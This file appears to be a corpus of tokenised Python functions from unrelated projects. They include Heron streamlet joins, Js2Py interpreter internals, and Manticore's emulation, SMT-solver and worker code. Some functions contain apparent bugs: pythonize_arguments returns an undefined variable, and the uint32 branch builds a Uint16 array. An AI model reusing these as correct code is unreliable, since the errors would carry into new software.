def outer_right_join ( self , join_streamlet , window_config , join_function ) : from heronpy . streamlet . impl . joinbolt import JoinStreamlet , JoinBolt join_streamlet_result = JoinStreamlet ( JoinBolt . OUTER_RIGHT , window_config , join_function , self , join_streamlet ) self . _add_child ( join_streamlet_result ) join_streamlet . _add_child ( join_streamlet_result ) return join_streamlet_result
def outer_left_join ( self , join_streamlet , window_config , join_function ) : from heronpy . streamlet . impl . joinbolt import JoinStreamlet , JoinBolt join_streamlet_result = JoinStreamlet ( JoinBolt . OUTER_LEFT , window_config , join_function , self , join_streamlet ) self . _add_child ( join_streamlet_result ) join_streamlet . _add_child ( join_streamlet_result ) return join_streamlet_result
def outer_join ( self , join_streamlet , window_config , join_function ) : from heronpy . streamlet . impl . joinbolt import JoinStreamlet , JoinBolt join_streamlet_result = JoinStreamlet ( JoinBolt . OUTER , window_config , join_function , self , join_streamlet ) self . _add_child ( join_streamlet_result ) join_streamlet . _add_child ( join_streamlet_result ) return join_streamlet_result
def expand_args ( command ) : # Prepare arguments. if isinstance ( command , ( str , unicode ) ) : splitter = shlex . shlex ( command . encode ( 'utf-8' ) ) splitter . whitespace = '|' splitter . whitespace_split = True command = [ ] while True : token = splitter . get_token ( ) if token : command . append ( token ) else : break command = list ( map ( shlex . split , command ) ) return command
def connect ( command , data = None , env = None , cwd = None ) : # TODO: support piped commands command_str = expand_args ( command ) . pop ( ) environ = dict ( os . environ ) environ . update ( env or { } ) process = subprocess . Popen ( command_str , universal_newlines = True , shell = False , env = environ , stdin = subprocess . PIPE , stdout = subprocess . PIPE , stderr = subprocess . PIPE , bufsize = 0 , cwd = cwd , ) return ConnectedCommand ( process = process )
def send ( self , str , end = '\n' ) : return self . _process . stdin . write ( str + end )
def Js ( val , Clamped = False ) : if isinstance ( val , PyJs ) : return val elif val is None : return undefined elif isinstance ( val , basestring ) : return PyJsString ( val , StringPrototype ) elif isinstance ( val , bool ) : return true if val else false elif isinstance ( val , float ) or isinstance ( val , int ) or isinstance ( val , long ) or ( NUMPY_AVAILABLE and isinstance ( val , ( numpy . int8 , numpy . uint8 , numpy . int16 , numpy . uint16 , numpy . int32 , numpy . uint32 , numpy . float32 , numpy . float64 ) ) ) : # This is supposed to speed things up. may not be the case if val in NUM_BANK : return NUM_BANK [ val ] return PyJsNumber ( float ( val ) , NumberPrototype ) elif isinstance ( val , FunctionType ) : return PyJsFunction ( val , FunctionPrototype ) #elif isinstance(val, ModuleType): #    mod = {} #    for name in dir(val): #        value = getattr(val, name) #        if isinstance(value, ModuleType): #            continue  # prevent recursive module conversion #        try: #            jsval = HJs(value) #        except RuntimeError: #            print 'Could not convert %s to PyJs object!' % name #            continue #        mod[name] = jsval #    return Js(mod) #elif isintance(val, ClassType): elif isinstance ( val , dict ) : # convert to object temp = PyJsObject ( { } , ObjectPrototype ) for k , v in six . iteritems ( val ) : temp . put ( Js ( k ) , Js ( v ) ) return temp elif isinstance ( val , ( list , tuple ) ) : #Convert to array return PyJsArray ( val , ArrayPrototype ) # convert to typedarray elif isinstance ( val , JsObjectWrapper ) : return val . __dict__ [ '_obj' ] elif NUMPY_AVAILABLE and isinstance ( val , numpy . ndarray ) : if val . dtype == numpy . int8 : return PyJsInt8Array ( val , Int8ArrayPrototype ) elif val . dtype == numpy . uint8 and not Clamped : return PyJsUint8Array ( val , Uint8ArrayPrototype ) elif val . dtype == numpy . uint8 and Clamped : return PyJsUint8ClampedArray ( val , Uint8ClampedArrayPrototype ) elif val . dtype == numpy . int16 : return PyJsInt16Array ( val , Int16ArrayPrototype ) elif val . dtype == numpy . uint16 : return PyJsUint16Array ( val , Uint16ArrayPrototype ) elif val . dtype == numpy . int32 : return PyJsInt32Array ( val , Int32ArrayPrototype ) elif val . dtype == numpy . uint32 : return PyJsUint16Array ( val , Uint32ArrayPrototype ) elif val . dtype == numpy . float32 : return PyJsFloat32Array ( val , Float32ArrayPrototype ) elif val . dtype == numpy . float64 : return PyJsFloat64Array ( val , Float64ArrayPrototype ) else : # try to convert to js object return py_wrap ( val )
def _set_name ( self , name ) : if self . own . get ( 'name' ) : self . func_name = name self . own [ 'name' ] [ 'value' ] = Js ( name )
def ConstructArray ( self , py_arr ) : arr = self . NewArray ( len ( py_arr ) ) arr . _init ( py_arr ) return arr
def ConstructObject ( self , py_obj ) : obj = self . NewObject ( ) for k , v in py_obj . items ( ) : obj . put ( unicode ( k ) , v ) return obj
def emit ( self , op_code , * args ) : self . tape . append ( OP_CODES [ op_code ] ( * args ) )
def compile ( self , start_loc = 0 ) : self . label_locs = { } if self . label_locs is None else self . label_locs loc = start_loc while loc < len ( self . tape ) : if type ( self . tape [ loc ] ) == LABEL : self . label_locs [ self . tape [ loc ] . num ] = loc del self . tape [ loc ] continue loc += 1 self . compiled = True
def pad ( num , n = 2 , sign = False ) : s = unicode ( abs ( num ) ) if len ( s ) < n : s = '0' * ( n - len ( s ) ) + s if not sign : return s if num >= 0 : return '+' + s else : return '-' + s
def replacement_template ( rep , source , span , npar ) : n = 0 res = '' while n < len ( rep ) - 1 : char = rep [ n ] if char == '$' : if rep [ n + 1 ] == '$' : res += '$' n += 2 continue elif rep [ n + 1 ] == '`' : # replace with string that is BEFORE match res += source [ : span [ 0 ] ] n += 2 continue elif rep [ n + 1 ] == '\'' : # replace with string that is AFTER match res += source [ span [ 1 ] : ] n += 2 continue elif rep [ n + 1 ] in DIGS : dig = rep [ n + 1 ] if n + 2 < len ( rep ) and rep [ n + 2 ] in DIGS : dig += rep [ n + 2 ] num = int ( dig ) # we will not do any replacements if we dont have this npar or dig is 0 if not num or num > len ( npar ) : res += '$' + dig else : # None - undefined has to be replaced with '' res += npar [ num - 1 ] if npar [ num - 1 ] else '' n += 1 + len ( dig ) continue res += char n += 1 if n < len ( rep ) : res += rep [ - 1 ] return res
def emit ( self , what , * args ) : if isinstance ( what , basestring ) : return self . exe . emit ( what , * args ) elif isinstance ( what , list ) : self . _emit_statement_list ( what ) else : return getattr ( self , what [ 'type' ] ) ( * * what )
def to_key ( literal_or_identifier ) : if literal_or_identifier [ 'type' ] == 'Identifier' : return literal_or_identifier [ 'name' ] elif literal_or_identifier [ 'type' ] == 'Literal' : k = literal_or_identifier [ 'value' ] if isinstance ( k , float ) : return unicode ( float_repr ( k ) ) elif 'regex' in literal_or_identifier : return compose_regex ( k ) elif isinstance ( k , bool ) : return 'true' if k else 'false' elif k is None : return 'null' else : return unicode ( k )
def trans ( ele , standard = False ) : try : node = globals ( ) . get ( ele [ 'type' ] ) if not node : raise NotImplementedError ( '%s is not supported!' % ele [ 'type' ] ) if standard : node = node . __dict__ [ 'standard' ] if 'standard' in node . __dict__ else node return node ( * * ele ) except : #print ele raise
def is_lval ( t ) : if not t : return False i = iter ( t ) if i . next ( ) not in IDENTIFIER_START : return False return all ( e in IDENTIFIER_PART for e in i )
def eval ( self , expression , use_compilation_plan = False ) : code = 'PyJsEvalResult = eval(%s)' % json . dumps ( expression ) self . execute ( code , use_compilation_plan = use_compilation_plan ) return self [ 'PyJsEvalResult' ]
def to_key ( literal_or_identifier ) : if literal_or_identifier [ 'type' ] == 'Identifier' : return literal_or_identifier [ 'name' ] elif literal_or_identifier [ 'type' ] == 'Literal' : k = literal_or_identifier [ 'value' ] if isinstance ( k , float ) : return unicode ( float_repr ( k ) ) elif 'regex' in literal_or_identifier : return compose_regex ( k ) elif isinstance ( k , bool ) : return u'true' if k else u'false' elif k is None : return u'null' else : return unicode ( k )
def to_arr ( this ) : return [ this . get ( str ( e ) ) for e in xrange ( len ( this ) ) ]
def match ( self , string , pos ) : return self . pat . match ( string , int ( pos ) )
def call ( self , this , args = ( ) ) : if self . is_native : _args = SpaceTuple ( args ) # we have to do that unfortunately to pass all the necessary info to the funcs _args . space = self . space return self . code ( this , _args ) # must return valid js object - undefined, null, float, unicode, bool, or PyJs else : return self . space . exe . _call ( self , this , args )
def is_empty_object ( n , last ) : if n . strip ( ) : return False # seems to be but can be empty code last = last . strip ( ) markers = { ')' , ';' , } if not last or last [ - 1 ] in markers : return False return True
def parse_exponent ( source , start ) : if not source [ start ] in { 'e' , 'E' } : if source [ start ] in IDENTIFIER_PART : raise SyntaxError ( 'Invalid number literal!' ) return start start += 1 if source [ start ] in { '-' , '+' } : start += 1 FOUND = False # we need at least one dig after exponent while source [ start ] in NUMS : FOUND = True start += 1 if not FOUND or source [ start ] in IDENTIFIER_PART : raise SyntaxError ( 'Invalid number literal!' ) return start
def in_op ( self , other ) : if not is_object ( other ) : raise MakeError ( 'TypeError' , "You can\'t use 'in' operator to search in non-objects" ) return other . has_property ( to_string ( self ) )
def maybe_download_and_extract ( ) : dest_directory = '.' filename = DATA_URL . split ( '/' ) [ - 1 ] filepath = os . path . join ( dest_directory , filename ) if not os . path . exists ( filepath ) : def _progress ( count , block_size , total_size ) : sys . stdout . write ( '\r>> Downloading %s %.1f%%' % ( filename , float ( count * block_size ) / float ( total_size ) * 100.0 ) ) sys . stdout . flush ( ) filepath , _ = urllib . request . urlretrieve ( DATA_URL , filepath , _progress ) print ( ) statinfo = os . stat ( filepath ) print ( 'Successfully downloaded' , filename , statinfo . st_size , 'bytes.' ) extracted_dir_path = os . path . join ( dest_directory , 'trees' ) if not os . path . exists ( extracted_dir_path ) : zip_ref = zipfile . ZipFile ( filepath , 'r' ) zip_ref . extractall ( dest_directory ) zip_ref . close ( )
def pythonize_arguments ( arg_str ) : out_args = [ ] # If there aren't any arguments return the empty string if arg_str is None : return out_str args = arg_str . split ( ',' ) for arg in args : components = arg . split ( '=' ) name_and_type = components [ 0 ] . split ( ' ' ) # There is probably type info if name_and_type [ - 1 ] == '' and len ( name_and_type ) > 1 : name = name_and_type [ - 2 ] else : name = name_and_type [ - 1 ] # if there are default parameters if len ( components ) > 1 : name += '=' + components [ 1 ] out_args . append ( name ) return ',' . join ( out_args )
def correspond ( text ) : if text : subproc . stdin . write ( text ) subproc . stdin . flush ( ) return get_lines ( )
def access_ok ( self , access ) : for c in access : if c not in self . perms : return False return True
def _in_range ( self , index ) : if isinstance ( index , slice ) : in_range = index . start < index . stop and index . start >= self . start and index . stop <= self . end else : in_range = index >= self . start and index <= self . end return in_range
def execute ( self ) : if issymbolic ( self . PC ) : raise ConcretizeRegister ( self , 'PC' , policy = 'ALL' ) if not self . memory . access_ok ( self . PC , 'x' ) : raise InvalidMemoryAccess ( self . PC , 'x' ) self . _publish ( 'will_decode_instruction' , self . PC ) insn = self . decode_instruction ( self . PC ) self . _last_pc = self . PC self . _publish ( 'will_execute_instruction' , self . PC , insn ) # FIXME (theo) why just return here? if insn . address != self . PC : return name = self . canonicalize_instruction_name ( insn ) if logger . level == logging . DEBUG : logger . debug ( self . render_instruction ( insn ) ) for l in self . render_registers ( ) : register_logger . debug ( l ) try : if self . _concrete and 'SYSCALL' in name : self . emu . sync_unicorn_to_manticore ( ) if self . _concrete and 'SYSCALL' not in name : self . emulate ( insn ) if self . PC == self . _break_unicorn_at : logger . debug ( "Switching from Unicorn to Manticore" ) self . _break_unicorn_at = None self . _concrete = False else : implementation = getattr ( self , name , None ) if implementation is not None : implementation ( * insn . operands ) else : text_bytes = ' ' . join ( '%02x' % x for x in insn . bytes ) logger . warning ( "Unimplemented instruction: 0x%016x:\t%s\t%s\t%s" , insn . address , text_bytes , insn . mnemonic , insn . op_str ) self . backup_emulate ( insn ) except ( Interruption , Syscall ) as e : e . on_handled = lambda : self . _publish_instruction_as_executed ( insn ) raise e else : self . _publish_instruction_as_executed ( insn )
def _publish_instruction_as_executed ( self , insn ) : self . _icount += 1 self . _publish ( 'did_execute_instruction' , self . _last_pc , self . PC , insn )
def viz_trace ( view ) : tv = TraceVisualizer ( view , None ) if tv . workspace is None : tv . workspace = get_workspace ( ) tv . visualize ( )
def viz_live_trace ( view ) : tv = TraceVisualizer ( view , None , live = True ) if tv . workspace is None : tv . workspace = get_workspace ( ) # update due to singleton in case we are called after a clear tv . live_update = True tv . visualize ( )
def visualize ( self ) : if os . path . isfile ( self . workspace ) : t = threading . Thread ( target = self . highlight_from_file , args = ( self . workspace , ) ) elif os . path . isdir ( self . workspace ) : t = threading . Thread ( target = self . highlight_from_dir , args = ( self . workspace , ) ) t . start ( )
def invalidate_cache ( cpu , address , size ) : cache = cpu . instruction_cache for offset in range ( size ) : if address + offset in cache : del cache [ address + offset ]
def LJMP ( cpu , cs_selector , target ) : logger . info ( "LJMP: Jumping to: %r:%r" , cs_selector . read ( ) , target . read ( ) ) cpu . CS = cs_selector . read ( ) cpu . PC = target . read ( )
def _hook_xfer_mem ( self , uc , access , address , size , value , data ) : assert access in ( UC_MEM_WRITE , UC_MEM_READ , UC_MEM_FETCH ) if access == UC_MEM_WRITE : self . _cpu . write_int ( address , value , size * 8 ) # If client code is attempting to read a value, we need to bring it # in from Manticore state. If we try to mem_write it here, Unicorn # will segfault. We add the value to a list of things that need to # be written, and ask to restart the emulation. elif access == UC_MEM_READ : value = self . _cpu . read_bytes ( address , size ) if address in self . _should_be_written : return True self . _should_be_written [ address ] = value self . _should_try_again = True return False return True
def _hook_unmapped ( self , uc , access , address , size , value , data ) : try : m = self . _create_emulated_mapping ( uc , address ) except MemoryException as e : self . _to_raise = e self . _should_try_again = False return False self . _should_try_again = True return False
def emulate ( self , instruction ) : # The emulation might restart if Unicorn needs to bring in a memory map # or bring a value from Manticore state. while True : self . reset ( ) # Establish Manticore state, potentially from past emulation # attempts for base in self . _should_be_mapped : size , perms = self . _should_be_mapped [ base ] self . _emu . mem_map ( base , size , perms ) for address , values in self . _should_be_written . items ( ) : for offset , byte in enumerate ( values , start = address ) : if issymbolic ( byte ) : from . . native . cpu . abstractcpu import ConcretizeMemory raise ConcretizeMemory ( self . _cpu . memory , offset , 8 , "Concretizing for emulation" ) self . _emu . mem_write ( address , b'' . join ( values ) ) # Try emulation self . _should_try_again = False self . _step ( instruction ) if not self . _should_try_again : break
def _step ( self , instruction ) : logger . debug ( "0x%x:\t%s\t%s" % ( instruction . address , instruction . mnemonic , instruction . op_str ) ) registers = set ( self . _cpu . canonical_registers ) # Refer to EFLAGS instead of individual flags for x86 if self . _cpu . arch == CS_ARCH_X86 : # The last 8 canonical registers of x86 are individual flags; replace # with the eflags registers -= set ( [ 'CF' , 'PF' , 'AF' , 'ZF' , 'SF' , 'IF' , 'DF' , 'OF' ] ) registers . add ( 'EFLAGS' ) # TODO(mark): Unicorn 1.0.1 does not support reading YMM registers, # and simply returns back zero. If a unicorn emulated instruction writes to an # XMM reg, we will read back the corresponding YMM register, resulting in an # incorrect zero value being actually written to the XMM register. This is # fixed in Unicorn PR #819, so when that is included in a release, delete # these two lines. registers -= set ( [ 'YMM0' , 'YMM1' , 'YMM2' , 'YMM3' , 'YMM4' , 'YMM5' , 'YMM6' , 'YMM7' , 'YMM8' , 'YMM9' , 'YMM10' , 'YMM11' , 'YMM12' , 'YMM13' , 'YMM14' , 'YMM15' ] ) registers |= set ( [ 'XMM0' , 'XMM1' , 'XMM2' , 'XMM3' , 'XMM4' , 'XMM5' , 'XMM6' , 'XMM7' , 'XMM8' , 'XMM9' , 'XMM10' , 'XMM11' , 'XMM12' , 'XMM13' , 'XMM14' , 'XMM15' ] ) # XXX(yan): This concretizes the entire register state. This is overly # aggressive. Once capstone adds consistent support for accessing # referred registers, make this only concretize those registers being # read from. for reg in registers : val = self . _cpu . read_register ( reg ) if issymbolic ( val ) : from . . native . cpu . abstractcpu import ConcretizeRegister raise ConcretizeRegister ( self . _cpu , reg , "Concretizing for emulation." , policy = 'ONE' ) self . _emu . reg_write ( self . _to_unicorn_id ( reg ) , val ) # Bring in the instruction itself instruction = self . _cpu . decode_instruction ( self . _cpu . PC ) text_bytes = self . _cpu . read_bytes ( self . _cpu . PC , instruction . size ) self . _emu . mem_write ( self . _cpu . PC , b'' . join ( text_bytes ) ) self . _emu . hook_add ( UC_HOOK_MEM_READ_UNMAPPED , self . _hook_unmapped ) self . _emu . hook_add ( UC_HOOK_MEM_WRITE_UNMAPPED , self . _hook_unmapped ) self . _emu . hook_add ( UC_HOOK_MEM_FETCH_UNMAPPED , self . _hook_unmapped ) self . _emu . hook_add ( UC_HOOK_MEM_READ , self . _hook_xfer_mem ) self . _emu . hook_add ( UC_HOOK_MEM_WRITE , self . _hook_xfer_mem ) self . _emu . hook_add ( UC_HOOK_INTR , self . _interrupt ) saved_PC = self . _cpu . PC try : pc = self . _cpu . PC if self . _cpu . arch == CS_ARCH_ARM and self . _uc_mode == UC_MODE_THUMB : pc |= 1 self . _emu . emu_start ( pc , self . _cpu . PC + instruction . size , count = 1 ) except UcError as e : # We request re-execution by signaling error; if we we didn't set # _should_try_again, it was likely an actual error if not self . _should_try_again : raise if self . _should_try_again : return if logger . isEnabledFor ( logging . DEBUG ) : logger . debug ( "=" * 10 ) for register in self . _cpu . canonical_registers : logger . debug ( f"Register {register:3s}  " f"Manticore: {self._cpu.read_register(register):08x}, " f"Unicorn {self._emu.reg_read(self._to_unicorn_id(register)):08x}" ) logger . debug ( ">" * 10 ) # Bring back Unicorn registers to Manticore for reg in registers : val = self . _emu . reg_read ( self . _to_unicorn_id ( reg ) ) self . _cpu . write_register ( reg , val ) # Unicorn hack. On single step, unicorn wont advance the PC register mu_pc = self . get_unicorn_pc ( ) if saved_PC == mu_pc : self . _cpu . PC = saved_PC + instruction . size # Raise the exception from a hook that Unicorn would have eaten if self . _to_raise : raise self . _to_raise return
def must_be_true ( self , constraints , expression ) -> bool : solutions = self . get_all_values ( constraints , expression , maxcnt = 2 , silent = True ) return solutions == [ True ]
def minmax ( self , constraints , x , iters = 10000 ) : if issymbolic ( x ) : m = self . min ( constraints , x , iters ) M = self . max ( constraints , x , iters ) return m , M else : return x , x
def _start_proc ( self ) : assert '_proc' not in dir ( self ) or self . _proc is None try : self . _proc = Popen ( shlex . split ( self . _command ) , stdin = PIPE , stdout = PIPE , bufsize = 0 , universal_newlines = True ) except OSError as e : print ( e , "Probably too many cached expressions? visitors._cache..." ) # Z3 was removed from the system in the middle of operation raise Z3NotFoundError # TODO(mark) don't catch this exception in two places # run solver specific initializations for cfg in self . _init : self . _send ( cfg )
def _reset ( self , constraints = None ) : if self . _proc is None : self . _start_proc ( ) else : if self . support_reset : self . _send ( "(reset)" ) for cfg in self . _init : self . _send ( cfg ) else : self . _stop_proc ( ) self . _start_proc ( ) if constraints is not None : self . _send ( constraints )
def _recv ( self ) -> str : buf , left , right = self . __readline_and_count ( ) bufl = [ buf ] while left != right : buf , l , r = self . __readline_and_count ( ) bufl . append ( buf ) left += l right += r buf = '' . join ( bufl ) . strip ( ) logger . debug ( '<%s' , buf ) if '(error' in bufl [ 0 ] : raise Exception ( f"Error in smtlib: {bufl[0]}" ) return buf
def _assert ( self , expression : Bool ) : assert isinstance ( expression , Bool ) smtlib = translate_to_smtlib ( expression ) self . _send ( '(assert %s)' % smtlib )
def can_be_true ( self , constraints , expression ) : if isinstance ( expression , bool ) : if not expression : return expression else : # if True check if constraints are feasible self . _reset ( constraints ) return self . _is_sat ( ) assert isinstance ( expression , Bool ) with constraints as temp_cs : temp_cs . add ( expression ) self . _reset ( temp_cs . to_string ( related_to = expression ) ) return self . _is_sat ( )
def get_all_values ( self , constraints , expression , maxcnt = None , silent = False ) : if not isinstance ( expression , Expression ) : return [ expression ] assert isinstance ( constraints , ConstraintSet ) assert isinstance ( expression , Expression ) expression = simplify ( expression ) if maxcnt is None : maxcnt = consts . maxsolutions with constraints as temp_cs : if isinstance ( expression , Bool ) : var = temp_cs . new_bool ( ) elif isinstance ( expression , BitVec ) : var = temp_cs . new_bitvec ( expression . size ) elif isinstance ( expression , Array ) : var = temp_cs . new_array ( index_max = expression . index_max , value_bits = expression . value_bits , taint = expression . taint ) . array else : raise NotImplementedError ( f"get_all_values only implemented for {type(expression)} expression type." ) temp_cs . add ( var == expression ) self . _reset ( temp_cs . to_string ( related_to = var ) ) result = [ ] while self . _is_sat ( ) : value = self . _getvalue ( var ) result . append ( value ) self . _assert ( var != value ) if len ( result ) >= maxcnt : if silent : # do not throw an exception if set to silent # Default is not silent, assume user knows # what they are doing and will check the size # of returned vals list (previous smtlib behavior) break else : raise TooManySolutions ( result ) return result
def get_value ( self , constraints , expression ) : if not issymbolic ( expression ) : return expression assert isinstance ( expression , ( Bool , BitVec , Array ) ) with constraints as temp_cs : if isinstance ( expression , Bool ) : var = temp_cs . new_bool ( ) elif isinstance ( expression , BitVec ) : var = temp_cs . new_bitvec ( expression . size ) elif isinstance ( expression , Array ) : var = [ ] result = [ ] for i in range ( expression . index_max ) : subvar = temp_cs . new_bitvec ( expression . value_bits ) var . append ( subvar ) temp_cs . add ( subvar == simplify ( expression [ i ] ) ) self . _reset ( temp_cs ) if not self . _is_sat ( ) : raise SolverError ( 'Model is not available' ) for i in range ( expression . index_max ) : self . _send ( '(get-value (%s))' % var [ i ] . name ) ret = self . _recv ( ) assert ret . startswith ( '((' ) and ret . endswith ( '))' ) pattern , base = self . _get_value_fmt m = pattern . match ( ret ) expr , value = m . group ( 'expr' ) , m . group ( 'value' ) result . append ( int ( value , base ) ) return bytes ( result ) temp_cs . add ( var == expression ) self . _reset ( temp_cs ) if not self . _is_sat ( ) : raise SolverError ( 'Model is not available' ) self . _send ( '(get-value (%s))' % var . name ) ret = self . _recv ( ) if not ( ret . startswith ( '((' ) and ret . endswith ( '))' ) ) : raise SolverError ( 'SMTLIB error parsing response: %s' % ret ) if isinstance ( expression , Bool ) : return { 'true' : True , 'false' : False } [ ret [ 2 : - 2 ] . split ( ' ' ) [ 1 ] ] if isinstance ( expression , BitVec ) : pattern , base = self . _get_value_fmt m = pattern . match ( ret ) expr , value = m . group ( 'expr' ) , m . group ( 'value' ) return int ( value , base ) raise NotImplementedError ( "get_value only implemented for Bool and BitVec" )
def colored_level_name ( self , levelname ) : if self . colors_disabled : return self . plain_levelname_format . format ( levelname ) else : return self . colored_levelname_format . format ( self . color_map [ levelname ] , levelname )
def all_events ( cls ) : all_evts = set ( ) for cls , evts in cls . __all_events__ . items ( ) : all_evts . update ( evts ) return all_evts
def forward_events_to ( self , sink , include_source = False ) : assert isinstance ( sink , Eventful ) , f'{sink.__class__.__name__} is not Eventful' self . _forwards [ sink ] = include_source
def context ( self ) : if self . _context is not None : return self . _context else : logger . warning ( "Using shared context without a lock" ) return self . _executor . _shared_context
def locked_context ( self , key = None , default = dict ) : keys = [ 'policy' ] if key is not None : keys . append ( key ) with self . _executor . locked_context ( '.' . join ( keys ) , default ) as policy_context : yield policy_context
def _visited_callback ( self , state , pc , instr ) : with self . locked_context ( 'visited' , set ) as ctx : ctx . add ( pc )
def _visited_callback ( self , state , pc , instr ) : pc = state . platform . current . PC with self . locked_context ( 'visited' , dict ) as ctx : ctx [ pc ] = ctx . get ( pc , 0 ) + 1
def put ( self , state_id ) : self . _states . append ( state_id ) self . _lock . notify_all ( ) return state_id
def get ( self ) : # A shutdown has been requested if self . is_shutdown ( ) : return None # if not more states in the queue, let's wait for some forks while len ( self . _states ) == 0 : # if no worker is running, bail out if self . running == 0 : return None # if a shutdown has been requested, bail out if self . is_shutdown ( ) : return None # if there ares actually some workers running, wait for state forks logger . debug ( "Waiting for available states" ) self . _lock . wait ( ) state_id = self . _policy . choice ( list ( self . _states ) ) if state_id is None : return None del self . _states [ self . _states . index ( state_id ) ] return state_id
def run ( self ) : # policy_order=self.policy_order # policy=self.policy current_state = None current_state_id = None with WithKeyboardInterruptAs ( self . shutdown ) : # notify siblings we are about to start a run self . _notify_start_run ( ) logger . debug ( "Starting Manticore Symbolic Emulator Worker (pid %d)." , os . getpid ( ) ) solver = Z3Solver ( ) while not self . is_shutdown ( ) : try : # handle fatal errors: exceptions in Manticore try : # handle external (e.g. solver) errors, and executor control exceptions # select a suitable state to analyze if current_state is None : with self . _lock : # notify siblings we are about to stop this run self . _notify_stop_run ( ) try : # Select a single state_id current_state_id = self . get ( ) # load selected state from secondary storage if current_state_id is not None : self . _publish ( 'will_load_state' , current_state_id ) current_state = self . _workspace . load_state ( current_state_id ) self . forward_events_from ( current_state , True ) self . _publish ( 'did_load_state' , current_state , current_state_id ) logger . info ( "load state %r" , current_state_id ) # notify siblings we have a state to play with finally : self . _notify_start_run ( ) # If current_state is still None. We are done. if current_state is None : logger . debug ( "No more states in the queue, byte bye!" ) break assert current_state is not None assert current_state . constraints is current_state . platform . constraints # Allows to terminate manticore worker on user request while not self . is_shutdown ( ) : if not current_state . execute ( ) : break else : # Notify this worker is done self . _publish ( 'will_terminate_state' , current_state , current_state_id , TerminateState ( 'Shutdown' ) ) current_state = None # Handling Forking and terminating exceptions except Concretize as e : # expression # policy # setstate() logger . debug ( "Generic state fork on condition" ) current_state = self . fork ( current_state , e . expression , e . policy , e . setstate ) except TerminateState as e : # Notify this worker is done self . _publish ( 'will_terminate_state' , current_state , current_state_id , e ) logger . debug ( "Generic terminate state" ) if e . testcase : self . _publish ( 'internal_generate_testcase' , current_state , message = str ( e ) ) current_state = None except SolverError as e : # raise import traceback trace = traceback . format_exc ( ) logger . error ( "Exception: %s\n%s" , str ( e ) , trace ) # Notify this state is done self . _publish ( 'will_terminate_state' , current_state , current_state_id , e ) if solver . check ( current_state . constraints ) : self . _publish ( 'internal_generate_testcase' , current_state , message = "Solver failed" + str ( e ) ) current_state = None except ( Exception , AssertionError ) as e : # raise import traceback trace = traceback . format_exc ( ) logger . error ( "Exception: %s\n%s" , str ( e ) , trace ) # Notify this worker is done self . _publish ( 'will_terminate_state' , current_state , current_state_id , e ) current_state = None assert current_state is None or self . is_shutdown ( ) # notify siblings we are about to stop this run self . _notify_stop_run ( )
def _hook_callback ( self , state , pc , instruction ) : # Ignore symbolic pc. # TODO(yan): Should we ask the solver if any of the hooks are possible, # and execute those that are? if issymbolic ( pc ) : return # Invoke all pc-specific hooks for cb in self . _hooks . get ( pc , [ ] ) : cb ( state ) # Invoke all pc-agnostic hooks for cb in self . _hooks . get ( None , [ ] ) : cb ( state )
def get_group ( name : str ) -> _Group : global _groups if name in _groups : return _groups [ name ] group = _Group ( name ) _groups [ name ] = group return group
def get_description ( self , name : str ) -> str : if name not in self . _vars : raise ConfigError ( f"{self.name}.{name} not defined." ) return self . _vars [ name ] . description
def correspond ( text ) : subproc . stdin . write ( text ) subproc . stdin . flush ( ) return drain ( )
def get_constructor_arguments ( self ) -> str : item = self . _constructor_abi_item return '()' if item is None else self . tuple_signature_for_components ( item [ 'inputs' ] )
def hashes ( self ) -> Tuple [ bytes , ... ] : selectors = self . _function_signatures_by_selector . keys ( ) return ( * selectors , self . fallback_function_selector )
def map_memory_callback ( self , address , size , perms , name , offset , result ) : logger . info ( ' ' . join ( ( "Mapping Memory @" , hex ( address ) if type ( address ) is int else "0x??" , hr_size ( size ) , "-" , perms , "-" , f"{name}:{hex(offset) if name else ''}" , "->" , hex ( result ) ) ) ) self . _emu . mem_map ( address , size , convert_permissions ( perms ) ) self . copy_memory ( address , size )
def unmap_memory_callback ( self , start , size ) : logger . info ( f"Unmapping memory from {hex(start)} to {hex(start + size)}" ) mask = ( 1 << 12 ) - 1 if ( start & mask ) != 0 : logger . error ( "Memory to be unmapped is not aligned to a page" ) if ( size & mask ) != 0 : size = ( ( size >> 12 ) + 1 ) << 12 logger . warning ( "Forcing unmap size to align to a page" ) self . _emu . mem_unmap ( start , size )
def protect_memory_callback ( self , start , size , perms ) : logger . info ( f"Changing permissions on {hex(start)}:{hex(start + size)} to {perms}" ) self . _emu . mem_protect ( start , size , convert_permissions ( perms ) )
def _hook_syscall ( self , uc , data ) : logger . debug ( f"Stopping emulation at {hex(uc.reg_read(self._to_unicorn_id('RIP')))} to perform syscall" ) self . sync_unicorn_to_manticore ( ) from . . native . cpu . abstractcpu import Syscall self . _to_raise = Syscall ( ) uc . emu_stop ( )
def _hook_write_mem ( self , uc , access , address , size , value , data ) : self . _mem_delta [ address ] = ( value , size ) return True
def _hook_unmapped ( self , uc , access , address , size , value , data ) : try : self . sync_unicorn_to_manticore ( ) logger . warning ( f"Encountered an operation on unmapped memory at {hex(address)}" ) m = self . _cpu . memory . map_containing ( address ) self . copy_memory ( m . start , m . end - m . start ) except MemoryException as e : logger . error ( "Failed to map memory {}-{}, ({}): {}" . format ( hex ( address ) , hex ( address + size ) , access , e ) ) self . _to_raise = e self . _should_try_again = False return False self . _should_try_again = True return False
def emulate ( self , instruction ) : # The emulation might restart if Unicorn needs to bring in a memory map # or bring a value from Manticore state. while True : # Try emulation self . _should_try_again = False self . _to_raise = None self . _step ( instruction ) if not self . _should_try_again : break
def sync_unicorn_to_manticore ( self ) : self . write_backs_disabled = True for reg in self . registers : val = self . _emu . reg_read ( self . _to_unicorn_id ( reg ) ) self . _cpu . write_register ( reg , val ) if len ( self . _mem_delta ) > 0 : logger . debug ( f"Syncing {len(self._mem_delta)} writes back into Manticore" ) for location in self . _mem_delta : value , size = self . _mem_delta [ location ] self . _cpu . write_int ( location , value , size * 8 ) self . write_backs_disabled = False self . _mem_delta = { }
